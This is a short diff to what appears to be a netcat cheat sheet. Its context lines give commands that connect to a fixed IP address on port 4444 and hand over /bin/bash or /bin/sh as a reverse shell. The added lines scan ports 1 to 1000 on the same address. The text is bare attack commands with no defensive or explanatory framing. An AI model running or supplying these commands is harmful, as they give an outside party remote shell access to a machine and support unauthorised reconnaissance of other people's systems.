@@ -20,4 +20,8 @@ nc 91.134.137.25 4444
 # connect to the server with bash or shell
 nc -e /bin/bash 91.134.137.25 4444
 nc -e /bin/sh 91.134.137.25 4444
+
+# basic port scan
+nc -v -n 91.134.137.25 1-1000
 ```
+
